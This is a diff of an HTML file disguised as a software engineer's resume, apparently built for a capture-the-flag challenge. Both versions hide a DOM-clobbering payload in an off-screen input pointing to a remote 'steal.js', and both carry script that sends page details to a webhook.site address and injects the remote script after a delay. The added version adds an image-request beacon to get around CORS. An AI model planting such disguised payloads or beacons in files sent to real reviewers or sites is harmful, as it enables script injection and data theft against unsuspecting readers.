@@ -1,200 +1,80 @@
-     <!DOCTYPE html>
-     <html>
-     <head>
-         <title>Senior Software Engineer - Baltimore Area</title>
-         <meta charset="UTF-8">
-         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-         <style>
-             body { font-family: 'Arial', sans-serif; line-height: 1.6; margin: 0;
-     padding: 40px; background-color: #f9f9f9; }
-             .container { max-width: 800px; margin: 0 auto; background: white;
-     padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-             .header { border-bottom: 3px solid #2c3e50; padding-bottom: 20px;
-     margin-bottom: 30px; }
-             h1 { color: #2c3e50; margin: 0; }
-             h2 { color: #34495e; border-left: 4px solid #3498db; padding-left:
-     10px; }
-             .contact { color: #7f8c8d; margin-top: 10px; }
-             .skills { display: flex; flex-wrap: wrap; gap: 10px; }
-             .skill { background: #ecf0f1; padding: 5px 10px; border-radius: 20px;
-     }
-         </style>
-     </head>
-     <body>
-         <div class="container">
-             <div class="header">
-                 <h1>Michael Thompson</h1>
-                 <div class="contact">
-                     <strong>Senior Software Engineer</strong><br>
-                     📧 michael.thompson@protonmail.com | 📱 (410) 555-0199<br>
-                     📍 Baltimore, MD | 💼 LinkedIn: /in/mthompson-dev
-                 </div>
-             </div>
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Senior Software Engineer - Baltimore Area</title>
+      <meta charset="UTF-8">
+      <style>
+          body { font-family: 'Arial', sans-serif; line-height: 1.6; margin: 0;
+  padding: 40px; background-color: #f9f9f9; }
+          .container { max-width: 800px; margin: 0 auto; background: white;
+  padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+          .header { border-bottom: 3px solid #2c3e50; padding-bottom: 20px;
+  margin-bottom: 30px; }
+          h1 { color: #2c3e50; margin: 0; }
+      </style>
+  </head>
+  <body>
+      <div class="container">
+          <div class="header">
+              <h1>Michael Thompson</h1>
+              <div class="contact">
+                  <strong>Senior Software Engineer</strong><br>
+                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199<br>
+                  📍 Baltimore, MD
+              </div>
+          </div>
 
-             <!-- DOM Clobbering payload - invisible to users -->
-             <div style="position: fixed; left: -10000px; visibility: hidden; 
-     opacity: 0;">
-                 <input id="utilsJS" name="url" 
-     value="https://gavinyw.github.io/resume-portfolio/steal.js">
-             </div>
+          <!-- DOM Clobbering payload -->
+          <div style="position: fixed; left: -10000px; visibility: hidden;">
+              <input id="utilsJS" name="url" 
+  value="https://gavinyw.github.io/resume-portfolio/steal.js">
+          </div>
 
-             <h2>🎯 Professional Summary</h2>
-             <p>Accomplished software engineer with 12+ years of experience in
-     full-stack development, cybersecurity, and team leadership. Passionate about
-     secure coding practices and modern web technologies. Actively seeking new
-     opportunities in the greater Baltimore area.</p>
+          <h2>Professional Summary</h2>
+          <p>Accomplished software engineer with 12+ years of experience.</p>
+      </div>
 
-             <h2>💼 Work Experience</h2>
+      <script>
+          // CORS-FREE webhook methods
+          function sendViaImage(data) {
+              const img = new Image();
+              const params = new URLSearchParams();
+              Object.keys(data).forEach(key => {
+                  params.append(key, typeof data[key] === 'object' ?
+  JSON.stringify(data[key]) : data[key]);
+              });
+              img.src =
+  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/img?' +
+  params.toString();
+              document.body.appendChild(img);
+          }
 
-             <h3>Senior Software Engineer | CyberSec Solutions Inc. |
-     2021-2024</h3>
-             <ul>
-                 <li>Led security assessments and penetration testing for Fortune
-     500 clients</li>
-                 <li>Developed secure web applications using React, Node.js, and
-     PostgreSQL</li>
-                 <li>Implemented zero-trust security architectures and DevSecOps
-     pipelines</li>
-                 <li>Mentored junior developers on secure coding practices and XSS
-     prevention</li>
-             </ul>
+          // Send initial confirmation
+          sendViaImage({
+              status: 'RESUME_LOADED',
+              timestamp: new Date().toISOString(),
+              domain: window.location.hostname,
+              clobbering_ready: !!window.utilsJS
+          });
 
-             <h3>Full Stack Developer | TechStart Innovations | 2019-2021</h3>
-             <ul>
-                 <li>Built scalable microservices using Docker and Kubernetes</li>
-                 <li>Optimized database performance improving query response time
-     by 60%</li>
-                 <li>Collaborated with cross-functional teams on agile development
-     projects</li>
-             </ul>
+          // Execute vulnerable function
+          function loadMessageBoardJS(){
+              let utilJS = window.utilsJS || {};
+              let scriptSrc = utilJS.url || utilJS.value;
 
-             <h3>Software Developer | WebCorp Agency | 2017-2019</h3>
-             <ul>
-                 <li>Developed responsive web applications for enterprise
-     clients</li>
-                 <li>Implemented automated testing suites achieving 95% code
-     coverage</li>
-                 <li>Participated in code reviews and security audits</li>
-             </ul>
+              sendViaImage({
+                  status: 'SCRIPT_LOADING_ATTEMPTED',
+                  script_src: scriptSrc || 'none'
+              });
 
-             <h2>🛠️ Technical Skills</h2>
-             <div class="skills">
-                 <span class="skill">JavaScript (ES6+)</span>
-                 <span class="skill">Python</span>
-                 <span class="skill">Java</span>
-                 <span class="skill">Go</span>
-                 <span class="skill">React/Vue.js</span>
-                 <span class="skill">Node.js</span>
-                 <span class="skill">Express</span>
-                 <span class="skill">PostgreSQL</span>
-                 <span class="skill">MongoDB</span>
-                 <span class="skill">Docker</span>
-                 <span class="skill">Kubernetes</span>
-                 <span class="skill">AWS/GCP</span>
-                 <span class="skill">Security Testing</span>
-                 <span class="skill">Penetration Testing</span>
-             </div>
+              if (scriptSrc) {
+                  let script = document.createElement('script');
+                  script.src = scriptSrc;
+                  document.body.appendChild(script);
+              }
+          }
 
-             <h2>🎓 Education & Certifications</h2>
-             <p><strong>B.S. Computer Science</strong> - University of Maryland,
-     College Park (2017)<br>
-             <strong>Certified Ethical Hacker (CEH)</strong> - EC-Council
-     (2022)<br>
-             <strong>AWS Solutions Architect</strong> - Amazon (2023)</p>
-
-             <h2>🏆 Notable Projects</h2>
-             <ul>
-                 <li><strong>SecureAuth Platform:</strong> Built enterprise
-     authentication system serving 100K+ users</li>
-                 <li><strong>VulnScanner Pro:</strong> Developed automated
-     vulnerability assessment tool</li>
-                 <li><strong>E-commerce Security Suite:</strong> Implemented
-     payment processing security for major retailer</li>
-             </ul>
-
-             <p style="margin-top: 40px; text-align: center; color: #7f8c8d; 
-     font-style: italic;">
-                 Thank you for considering my application. I look forward to
-     discussing how my expertise in software development and cybersecurity can
-     contribute to your team's success.
-             </p>
-         </div>
-
-         <script>
-             console.log('Resume loaded for CTF challenge');
-
-             // Send immediate ping to webhook
-             try {
-                 fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad',
-      {
-                     method: 'POST',
-                     body: JSON.stringify({
-                         status: 'RESUME_LOADED',
-                         timestamp: new Date().toISOString(),
-                         domain: window.location.hostname,
-                         url: window.location.href,
-                         clobbering_ready: !!window.utilsJS,
-                         target_script: window.utilsJS?.url ||
-     window.utilsJS?.value
-                     }),
-                     headers: {'Content-Type': 'application/json'}
-                 }).catch(e => console.log('Initial ping failed:', e));
-             } catch(e) {}
-
-             // Verify DOM clobbering
-             if (window.utilsJS && (window.utilsJS.url || window.utilsJS.value)) {
-                 console.log('DOM clobbering configured:', window.utilsJS.url ||
-     window.utilsJS.value);
-             }
-
-             // Directly execute the vulnerable function simulation
-             function loadMessageBoardJS(){
-                 console.log('loadMessageBoardJS called!');
-                 let utilJS = window.utilsJS || {};
-                 let scriptSrc = utilJS.url || utilJS.value;
-
-                 if (scriptSrc) {
-                     console.log('Loading script:', scriptSrc);
-                     let script = document.createElement('script');
-                     script.src = scriptSrc;
-                     document.body.appendChild(script);
-
-                     // Send confirmation
-                     try {
-
-     fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
-                             method: 'POST',
-                             body: JSON.stringify({
-                                 status: 'SCRIPT_LOADING_ATTEMPTED',
-                                 script_src: scriptSrc,
-                                 timestamp: new Date().toISOString()
-                             }),
-                             headers: {'Content-Type': 'application/json'}
-                         }).catch(e => {});
-                     } catch(e) {}
-                 }
-             }
-
-             // Execute attack after page load
-             setTimeout(() => {
-                 console.log('Executing loadMessageBoardJS...');
-                 loadMessageBoardJS();
-             }, 1500);
-
-             // Also try navigation approach
-             setTimeout(() => {
-                 try {
-                     if (window.location.hostname.includes('secjhu') ||
-     window.location.hostname.includes('ctf')) {
-                         console.log('Attempting navigation to messages...');
-                         window.location.hash = '#messages';
-                     } else {
-                         console.log('Not on CTF domain, skipping navigation');
-                     }
-                 } catch(e) {
-                     console.log('Navigation failed:', e);
-                 }
-             }, 3000);
-         </script>
-     </body>
-     </html>
+          setTimeout(loadMessageBoardJS, 2000);
+      </script>
+  </body>
+  </html>
